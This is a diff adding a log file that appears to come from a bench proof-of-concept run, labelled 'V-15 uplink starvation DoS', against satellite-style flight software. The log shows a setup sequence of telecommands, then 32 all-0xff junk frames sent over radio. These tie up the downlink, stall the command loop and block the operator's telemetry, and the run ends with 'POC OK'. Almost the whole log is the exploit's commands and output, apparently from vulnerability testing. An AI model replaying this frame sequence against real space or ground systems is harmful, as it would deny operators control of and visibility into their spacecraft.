@@ -1,0 +1,127 @@
+[   0.000] ========================================================================
+[   0.000] V-15 uplink starvation DoS
+[   0.000] ========================================================================
+[   1.520] --> HARD RESET (bench parity: fresh board per PoC)
+[   8.852] --> TC apid=0x0A via=usb AES  payload=00
+[   8.904] <-- TM apid=0x0A clear len=3
+[   8.956] --> TC apid=0x1D via=usb clear payload=0101
+[   9.007] <-- TM apid=0x1D clear len=4
+[   9.007] --> TC apid=0x11 via=usb clear payload=00
+[   9.468] <-- TM apid=0x11 clear len=9
+[   9.468] --> TC apid=0x15 via=usb clear payload=001005
+[   9.918] <-- TM apid=0x15 clear len=6
+[   9.918] --> TC apid=0x0D via=usb clear payload=01
+[  10.368] <-- TM apid=0x0D clear len=4
+[  10.410] --> TC apid=0x1D via=usb clear payload=03
+[  10.462] <-- TM apid=0x1D clear len=4
+[  10.462] <-- TM apid=0x09 clear len=9
+[  10.514] --> TC apid=0x1D via=usb clear payload=0a0258
+[  10.565] <-- TM apid=0x1D clear len=4
+[  10.565] --> TC apid=0x10 via=usb clear payload=00
+[  10.617] <-- TM apid=0x10 clear len=4
+[  10.617] --> TC apid=0x21 via=usb clear payload=00
+[  11.078] <-- TM apid=0x21 clear len=6
+[  11.078] --> TC apid=0x24 via=usb clear payload=0000
+[  11.119] <-- TM apid=0x24 clear len=8
+[  11.119] --> TC apid=0x24 via=usb clear payload=0100
+[  11.170] <-- TM apid=0x24 clear len=8
+[  11.170] --> TC apid=0x24 via=usb clear payload=0200
+[  11.212] <-- TM apid=0x24 clear len=8
+[  11.212] --> TC apid=0x24 via=usb clear payload=0300
+[  11.263] <-- TM apid=0x24 clear len=8
+[  11.263] --> TC apid=0x25 via=usb clear payload=0080
+[  11.315] <-- TM apid=0x25 clear len=4
+[  11.315] --> TC apid=0x1E via=usb clear payload=01
+[  11.827] <-- TM apid=0x1E clear len=5
+[  11.827] --> TC apid=0x1D via=usb clear payload=0b
+[  11.920] <-- TM apid=0x1D clear len=4
+[  11.920] --> TC apid=0x05 via=usb clear payload=12
+[  12.380] --> TC apid=0x1F via=usb clear payload=0600000000000000000000000700
+[  12.881] <-- TM apid=0x1F clear len=4
+[  12.881] --> TC apid=0x1F via=usb clear payload=05
+[  13.383] <-- TM apid=0x1F clear len=4
+[  13.383] --> TC apid=0x0A via=usb clear payload=01
+[  13.428] <-- TM apid=0x0A AES len=3
+[  21.522] --> TC apid=0x14 via=usb AES  payload=406c841500e055bb801a060008
+[  29.998] <-- TM apid=0x0E AES len=18
+[  29.998] --> REARM (bench parity: fresh board, pre-PoC)
+[  30.071] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[  30.524] <-- TM apid=0x09 AES len=17
+[  30.524] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[  33.747] <-- TM apid=0x09 AES len=17
+[  33.747] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[  36.961] <-- TM apid=0x09 AES len=17
+[  36.961] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[  40.132] <-- TM apid=0x09 AES len=17
+[  40.132] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[  43.346] <-- TM apid=0x09 AES len=17
+[  43.346] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[  46.559] <-- TM apid=0x09 AES len=17
+[  46.559] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[  49.771] <-- TM apid=0x09 AES len=17
+[  49.771] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[  52.991] <-- TM apid=0x09 AES len=17
+[  52.991] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[  56.162] <-- TM apid=0x09 AES len=17
+[  56.162] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[  59.385] <-- TM apid=0x09 AES len=17
+[  59.385] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[  62.598] <-- TM apid=0x09 AES len=17
+[  62.598] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[  65.821] <-- TM apid=0x09 AES len=17
+[  65.821] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[  68.984] <-- TM apid=0x09 AES len=17
+[  68.984] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[  72.196] <-- TM apid=0x09 AES len=17
+[  72.196] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[  75.418] <-- TM apid=0x09 AES len=17
+[  75.418] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[  78.632] <-- TM apid=0x09 AES len=17
+[  78.632] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[  81.854] <-- TM apid=0x09 AES len=17
+[  81.854] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[  85.026] <-- TM apid=0x09 AES len=17
+[  85.026] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[  88.239] <-- TM apid=0x09 AES len=17
+[  88.239] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[  91.452] <-- TM apid=0x09 AES len=17
+[  91.452] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[  94.677] <-- TM apid=0x09 AES len=17
+[  94.677] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[  97.891] <-- TM apid=0x09 AES len=17
+[  97.891] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[ 101.054] <-- TM apid=0x09 AES len=17
+[ 101.054] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[ 104.280] <-- TM apid=0x09 AES len=17
+[ 104.280] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[ 107.494] <-- TM apid=0x09 AES len=17
+[ 107.494] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[ 110.717] <-- TM apid=0x09 AES len=17
+[ 110.717] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[ 113.877] <-- TM apid=0x09 AES len=17
+[ 113.877] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[ 117.098] <-- TM apid=0x09 AES len=17
+[ 117.098] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[ 120.312] <-- TM apid=0x09 AES len=17
+[ 120.312] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[ 123.535] <-- TM apid=0x09 AES len=17
+[ 123.536] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[ 126.750] <-- TM apid=0x09 AES len=17
+[ 126.750] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[ 129.912] <-- TM apid=0x09 AES len=17
+[ 129.912] 32/32 junk frames -> error TMs (each also AES-wrapped)
+[ 129.912] --> TC apid=0x28 via=radio AES  payload=-
+[ 133.137] <-- TM apid=0x09 AES len=19
+[ 133.137] downlink occupied: 8.4 s TX + 53-66 s of blocking blink in the command loop -> 18 s beacon cadence lost, no TM delivered during the stall
+[ 133.137] --> TC apid=0x05 via=usb AES  payload=01
+[ 133.597] --> advance(3000 ms)
+[ 136.637] <-- TM apid=0x27 clear len=4
+[ 136.642] <-- TM apid=0x01 AES len=64
+[ 136.644] <-- TM apid=0x01 AES len=64
+[ 136.644] --> TC apid=0x0C via=usb AES  payload=-
+[ 136.699] <-- TM apid=0x0C AES len=27
+[ 136.699] => attacker jams the OPERATOR's own telemetry with 33 valid-format frames
+[ 136.699] -- console tail: [TC - SPP] APID=0x027 SEQ=1 LEN=45 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x001 SEQ=1 LEN=32 FLAGS=1 SEC_HDR=NO | [ERROR] Secure link payload decrypt failed | [TC - SPP] APID=0x027 SEQ=1 LEN=45 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x001 SEQ=1 LEN=32 FLAGS=1 SEC_HDR=NO | [ERROR] Secure link payload decrypt failed | [TC - SPP] APID=0x027 SEQ=1 LEN=29 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x028 SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [ERROR] Unknown APID: 0x28 | [TC - SPP] APID=0x005 SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=5 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=5 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x00C SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO
+[ 136.699] ========================================================================
+[ 136.699] POC OK
+[ 136.699] ========================================================================
